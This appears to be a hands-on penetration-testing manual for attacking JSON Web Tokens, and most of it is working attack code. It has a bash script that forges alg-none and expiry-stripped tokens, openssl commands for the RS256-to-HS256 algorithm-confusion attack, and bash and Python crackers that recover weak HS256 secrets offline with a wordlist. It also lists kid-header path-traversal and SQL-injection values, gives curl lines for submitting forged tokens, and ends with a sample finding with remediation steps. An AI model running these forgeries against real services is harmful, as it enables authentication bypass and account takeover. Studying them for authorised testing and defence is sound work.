JWT and Token Attacks by Hand

Summary

ps-07 covered the theory and ran an attack battery in Python. This note is the manual version:
how to decode, tamper, re-sign, and forge against a live service using only openssl, base64,
and a text editor.

The reason to do it by hand once is that a library hides exactly the
step that attackers rely on — the split into header.payload.signature
and the choice of what the library lets you change.

Companion to ps-07 and cry-04. This is the operations manual.

Step 2: the two edits you always make

#!/usr/bin/env bash
# jwt-edit.sh - the whole attack surface in one file
# usage: ./jwt-edit.sh <jwt>
JWT="$1"
H=$(echo "$JWT" | cut -d. -f1)
P=$(echo "$JWT" | cut -d. -f2)
b64() { printf '%s' "$1" | base64 -w0 | tr '+/' '-_' | tr -d '='; }
d()   { echo "$1" | tr '_-' '/+' | base64 -d 2>/dev/null; }

echo "=== ORIGINAL ==="
d "$H" | python3 -m json.tool | sed 's/^/  /'
d "$P" | python3 -m json.tool | sed 's/^/  /'
echo

echo "=== EDIT 1: remove the expiry (exp = far future) ==="
P1=$(d "$P" | python3 -c "
import json,sys
p = json.load(sys.stdin)
p['exp'] = 4102444800   # 2100-01-01
print(json.dumps(p, separators=(',',':')))")
echo "  payload: $P1"
echo "  forged : $(b64 "$H").$(b64 "$P1").<signature>"
echo "  ^ the signature is now wrong. The server will reject it."
echo "    That is expected. The point is you can produce ANY claim."
echo

echo "=== EDIT 2: alg none ==="
HN='{"alg":"none","typ":"JWT"}'
echo "  forged : $(b64 "$HN").$(b64 "$P1")."
echo "  ^ no signature at all. If the server accepts this, it is Critical."
echo

echo "=== EDIT 3: empty signature ==="
echo "  forged : $(b64 "$HN").$(b64 "$P1").AAAAdeadbeef"
echo "  ^ many verifiers never look at the signature when alg is none."
echo

echo "=== the claims worth changing, listed ==="
for c in sub role admin user_id is_admin scope aud iss; do
  printf "  %-10s -> if the server trusts it without a check, this is an escalation\n" "$c"
done
echo
echo "=== TO SUBMIT: replace the token in the request ==="
echo "  curl -H 'Authorization: Bearer <forged>' https://target/api/me"
echo "  or: curl -b 'session=<forged>' https://target/"

Step 3: the algorithm confusion attack, by hand

# The RSA public key, as the server holds it
openssl s_client -connect target:443 -servername target </dev/null 2>/dev/null \
  | openssl x509 -pubkey -noout > pub.pem

# Now use that PUBLIC KEY as an HMAC secret, and sign with alg HS256
PAYLOAD=$(echo '{"sub":"1","role":"admin","exp":4102444800}' \
  | base64 -w0 | tr '+/' '-_' | tr -d '=')
HEADER=$(echo '{"alg":"HS256","typ":"JWT"}' \
  | base64 -w0 | tr '+/' '-_' | tr -d '=')

# The "secret" is the public key file, byte for byte
SIG=$(printf '%s.%s' "$HEADER" "$PAYLOAD" \
  | openssl dgst -sha256 -hmac "$(cat pub.pem)" -binary \
  | base64 -w0 | tr '+/' '-_' | tr -d '=')

echo "  forged: ${HEADER}.${PAYLOAD}.${SIG}"
echo
echo "  WHY IT WORKS:"
echo "    RS256 verification needs only the PUBLIC key - so the server has it."
echo "    HS256 signing needs a SECRET - but if the server accepts the public"
echo "    key as an HMAC secret, it is verifying an HS256 signature with the"
echo "    very key an attacker can read. Asymmetry becomes symmetry."
echo
echo "  The defence is one line in the library:"
echo "    configure the expected algorithm; never read alg from the token."

Step 4: brute-forcing a weak HS256 secret, offline

#!/usr/bin/env bash
# The key insight: this runs OFFLINE. No rate limit, no lockout,
# no server contact. You are not attacking the server; you are
# attacking a string you already have.
J="$1"
H=$(echo "$J" | cut -d. -f1); P=$(echo "$J" | cut -d. -f2); S=$(echo "$J" | cut -d. -f3)
WORDLIST="${2:-/usr/share/wordlists/rockyou.txt}"

for w in $(head -200000 "$WORDLIST"); do
  got=$(printf '%s.%s' "$H" "$P" | openssl dgst -sha256 -hmac "$w" -binary \
        | base64 -w0 | tr '+/' '-_' | tr -d '=')
  if [ "$got" = "$S" ]; then echo "  SECRET FOUND: $w"; exit 0; fi
done
echo "  not found in the first 200k of $WORDLIST"
echo
echo "  This is the whole attack. Note what it is NOT:"
echo "    - not a login attempt, so no MFA, no lockout, no alert"
echo "    - not a server request, so no rate limit"
echo "    - it does not even need the server to be UP"
echo
echo "  The defence is a 256-bit secret. A JWT signed with HS256 and a"
echo "  weak secret is equivalent to a password with a low entropy."

# the same thing, faster, using hmac directly
import hmac, hashlib, base64, sys, time

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=")

def try_secret(jwt: str, secret: str) -> bool:
    h, p, s = jwt.split(".")
    expect = b64u(hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest())
    return hmac.compare_digest(expect.decode(), s)

jwt = sys.argv[1] if len(sys.argv) > 1 else ""
if jwt:
    print("\n  trying a dictionary, with a progress report:")
    t0 = time.time()
    n = 0
    try:
        for w in open("/usr/share/wordlists/rockyou.txt", encoding="latin-1"):
            w = w.rstrip("\n")
            n += 1
            if try_secret(jwt, w):
                print(f"  FOUND after {n} candidates in {time.time()-t0:.1f}s: {w!r}")
                sys.exit(0)
            if n % 200000 == 0:
                print(f"    {n:,} tried...")
    except FileNotFoundError:
        print("  rockyou not at the default path; pass a wordlist")
    print(f"  {n:,} tried in {time.time()-t0:.1f}s, no match")
else:
    print("  usage: crack_jwt.py <jwt>   (the offline half of a JWT attack)")

Step 5: kid injection

  IF THE TOKEN HAS A kid HEADER, the server uses it to CHOOSE A KEY.
  How the server resolves it determines the vulnerability:

    kid = ../../../../dev/null    -> the "key" is empty or a file
    kid = "../../../../etc/passwd" -> the key becomes a file's contents
    kid = "sql' UNION SELECT ... --" -> key lookup is a SQL query

  IF THE KEY IS THEN USED AS AN HMAC SECRET (HS256):
    the attacker controls the secret, so any signature verifies.

  TEST: change the kid to a path and to a SQL fragment and observe.
  The safe design is a strict allowlist of key identifiers.

# check whether kid exists at all before trying anything

  && echo "  kid present - test it" \
  || echo "  no kid - this attack does not apply"

Step 6: the reporting standard

  ## F-xx · JWT accepted with `alg: none`

  Risk
    The API accepts a JWT with the algorithm header set to "none" and
    no signature, allowing any user to mint a token for any identity,
    including administrator. Full account takeover and, depending on the
    API's scope, data access as any account.

  Prerequisite
    Any HTTP access to the API. No credentials, no user interaction.

  Evidence
    ```
    GET /api/admin/users HTTP/1.1
    Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
    ```
    -> HTTP 200 with the full user list, as an unauthenticated caller.

  Remediation
    1. Configure the expected algorithm server-side; reject "none"
    2. Use a maintained JWT library and upgrade it
    3. Reject any token whose header algorithm is not in an allowlist
    4. Re-issue all sessions: existing tokens signed under the old
       behaviour remain valid

  Re-test
    Included at +30 days.
